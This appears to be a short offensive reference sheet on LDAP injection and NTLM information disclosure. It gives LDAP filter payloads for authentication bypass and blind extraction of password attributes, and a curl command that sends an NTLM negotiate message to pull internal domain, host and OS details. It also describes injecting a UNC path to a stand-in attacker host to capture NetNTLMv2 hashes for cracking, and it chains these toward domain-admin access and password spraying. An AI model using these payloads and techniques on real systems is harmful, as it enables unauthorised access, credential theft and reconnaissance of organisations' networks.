# LDAP Injection & NTLM Info Disclosure Reference

## Attack Surface Signals
- **LDAP**: Corporate directories, address books, intranet logins, user search forms querying Active Directory / OpenLDAP.
- **NTLM**: Windows IIS servers, Exchange / OWA, ADFS, endpoints returning `WWW-Authenticate: NTLM`.

## LDAP Injection Patterns
1. **Filter Grammar (RFC 4515)**:
   - Standard query: `(&(user=INPUT)(pass=INPUT))`
2. **Authentication Bypass Payloads**:
   - `admin)(&)` -> Query becomes: `(&(user=admin)(&))(pass=...))` (bypasses password check).
   - `*)(&)` -> Logs in as first user in directory.
   - `admin)(|(&(1=1)`
3. **Blind LDAP Exfiltration**:
   - Extract attributes character by character:
     `admin)(password=a*)`
     `admin)(password=ab*)`
     `admin)(telephoneNumber=555-01*)`

## NTLM Information Disclosure
1. **NTLM Type 2 Challenge Extraction**:
   - Send NTLM Type 1 Negotiate message:
     ```bash
     curl -s -I -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==" https://target.com/owa/
     ```
   - Server returns `WWW-Authenticate: NTLM TlRMTVNTUAACAAA...` (Type 2 Challenge).
2. **Decoded Data Extracted from Type 2**:
   - Exact Windows OS version and build number.
   - Internal Active Directory Domain NetBIOS Name and FQDN.
   - Internal Computer NetBIOS Name and FQDN.
   - Forest name and DNS server hostname.

## NetNTLM Hash Harvesting (Coerced Authentication)
- Inject UNC paths (`\attacker-ip\share`) in file download, image preview, or XML external entity vectors to capture NetNTLMv2 hashes for offline cracking.

## Exploit Chains
- **LDAP Injection → Bypass Authentication as Domain Admin**.
- **NTLM Challenge Recon → Internal AD Domain Topology Mapped for Password Spraying**.
